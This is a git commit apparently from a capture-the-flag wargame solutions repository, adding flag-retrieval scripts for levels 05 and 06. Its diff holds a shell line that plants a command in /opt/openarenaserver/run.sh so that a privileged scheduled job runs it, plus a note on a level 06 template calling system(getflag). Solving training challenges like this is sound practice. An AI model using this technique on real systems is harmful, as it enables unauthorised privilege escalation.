6bc97271670e95c5810b630cced2d84c564d6b16
Abdelilah Majid <abdelilahmajid012@gmail.com>
2026-02-26 01:30:03 +0000

    Add getflag helpers and flags for levels 05-06
    Add flag files and resource scripts to trigger flag retrieval.
    level05/resources/getflag.sh writes 'getflag > /tmp/flag' into
    /opt/openarenaserver/run.sh so the flag will appear in /tmp/flag.
    level06/resources/getflag contains a template that invokes
    system(getflag) to execute getflag.

---
+++ level05/resources/getflag.sh
@@ -0,0 +1,3 @@
+echo "getflag > /tmp/flag" > /opt/openarenaserver/run.sh
+# wait for 2 minutes and the flag will be available in /tmp/flag
+# usful files /usr/sbin/openarenaserver and /var/spool/mail/level05
